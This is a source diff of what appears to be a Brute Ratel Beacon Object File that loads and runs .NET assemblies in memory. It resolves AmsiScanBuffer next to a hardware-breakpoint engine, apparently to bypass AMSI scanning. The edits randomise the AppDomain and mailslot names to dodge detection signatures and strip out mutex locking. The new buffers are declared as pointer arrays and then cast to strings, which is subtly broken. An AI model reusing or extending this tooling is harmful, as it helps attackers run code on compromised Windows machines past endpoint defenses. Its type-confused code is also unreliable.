@@ -319,7 +319,7 @@ NTSTATUS HwBpEngineDestroy(
     if ( ! gEngine ) {
         return STATUS_INVALID_PARAMETER;
     }
-    KERNEL32$WaitForSingleObject(ghMutex,INFINITE);
+    //KERNEL32$WaitForSingleObject(ghMutex,INFINITE);
 //    if ( ! HwBpEngine ) {
 //        HwBpEngine = Instance.HwBpEngine;
 //    }
@@ -341,7 +341,7 @@ NTSTATUS HwBpEngineDestroy(
         BpNext = BpEntry->Next;
 
         /* disable hardware breakpoinnt */
-        HwBpEngineSetBp( BpEntry->Tid, BpEntry->Address, BpEntry->Position, TRUE );
+        HwBpEngineSetBp( BpEntry->Tid, BpEntry->Address, BpEntry->Position, FALSE );
 
         /* zero out struct */
         BadgerMemset( BpEntry,0, sizeof( BP_LIST ) );
@@ -362,7 +362,7 @@ NTSTATUS HwBpEngineDestroy(
     MSVCRT$free(gEngine);
 
     gEngine = NULL;
-    KERNEL32$ReleaseMutex(ghMutex);
+//    KERNEL32$ReleaseMutex(ghMutex);
     return STATUS_SUCCESS;
 }
 //
@@ -380,7 +380,7 @@ LONG ExceptionHandler(
     BadgerDispatch(gdispatch, "Exception Address: %p\n", Exception->ExceptionRecord->ExceptionAddress );
     BadgerDispatch(gdispatch, "Exception Code   : %p\n", Exception->ExceptionRecord->ExceptionCode );
 #endif
-    KERNEL32$WaitForSingleObject (ghMutex, INFINITE);
+    //KERNEL32$WaitForSingleObject (ghMutex, INFINITE);
     if ( Exception->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP && gEngine != NULL)
     {
         BpEntry = gEngine->Breakpoints;
@@ -411,11 +411,11 @@ LONG ExceptionHandler(
         BadgerDispatch(gdispatch, "Found exception handler: %s\n", Found ? "TRUE" : "FALSE" );
 #endif
         if ( Found ) {
-            KERNEL32$ReleaseMutex(ghMutex);
+//            KERNEL32$ReleaseMutex(ghMutex);
             return EXCEPTION_CONTINUE_EXECUTION;
         }
     }
-    KERNEL32$ReleaseMutex(ghMutex);
+//    KERNEL32$ReleaseMutex(ghMutex);
     return EXCEPTION_CONTINUE_SEARCH;
 }
 //
@@ -626,15 +626,22 @@ BOOL consoleExists(void) {//https://www.devever.net/~hl/win32con
     return TRUE;
 }
 
+void fillRandomString(char *string, int length){
+    for(int i=0;i<length-1;i++){
+        string[i] = 'a' + (MSVCRT$rand() % 26);
+    }
+    string[length-1] = '\0';
+}
+
 /*BOF Entry Point*/
 void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly in memory
     gdispatch = dispatch;
 #ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] Entered\n");
 #endif
-    char* appDomain = "asmranddomain";
+    char* appDomain[5];
     char* assemblyArguments = NULL;
-    char* slotName = "mysecondslot";
+    char* slotName[5];
     ULONG entryPoint = 1;
     SIZE_T toEncodeSize = 0;
     char* toEncode = NULL;
@@ -757,7 +764,11 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     BadgerMemcpy(assemblyArguments,ps_script_b64,base64_size);
     MSVCRT$free(ps_script_b64);
     ps_script_b64 = NULL;
-
+    //generate random slotname
+    fillRandomString(slotName,5);
+#ifdef DEBUG
+    BadgerDispatch(gdispatch,"[*] slotName = %s\n",slotName);
+#endif
     //Create slot and pipe names
     SIZE_T slotNameLen = MSVCRT$strlen(slotName);
     slotPath = MSVCRT$malloc(slotNameLen + 14);
@@ -781,10 +792,6 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         wNetVersion = L"v2.0.50727";
     }
     BadgerDispatchW(gdispatch,L"[*] Using .NET version %ws\n",wNetVersion);
-    ghMutex = KERNEL32$CreateMutexA(
-            NULL,              // default security attributes
-            FALSE,             // initially not owned
-            NULL);             // unnamed mutex
     HwBpEngineInit( NULL, NULL );
     FARPROC amsiscanbuffer = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"),"AmsiScanBuffer");
 #ifdef DEBUG
@@ -813,6 +820,11 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
 #ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] ConvertedChars = %d\n",convertedChars);
 #endif
+    //generate random appDomain string
+    fillRandomString(appDomain,5);
+#ifdef DEBUG
+    BadgerDispatch(gdispatch,"[*] appDomain = %s\n",appDomain);
+#endif
     //Convert appDomain to wide string wAppDomain to pass to CreateDomain
     size_t convertedChars2 = 0;
     wideSize2 = MSVCRT$strlen(appDomain) + 1;
@@ -820,7 +832,7 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     BadgerDispatch(gdispatch,"[*] wideSize2 = %d\n",wideSize2);
 #endif
     wAppDomain = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
-    MSVCRT$mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);
+    MSVCRT$mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, (char*)appDomain, _TRUNCATE);
 #ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] ConvertedChars2 = %d\n",convertedChars2);
 #endif
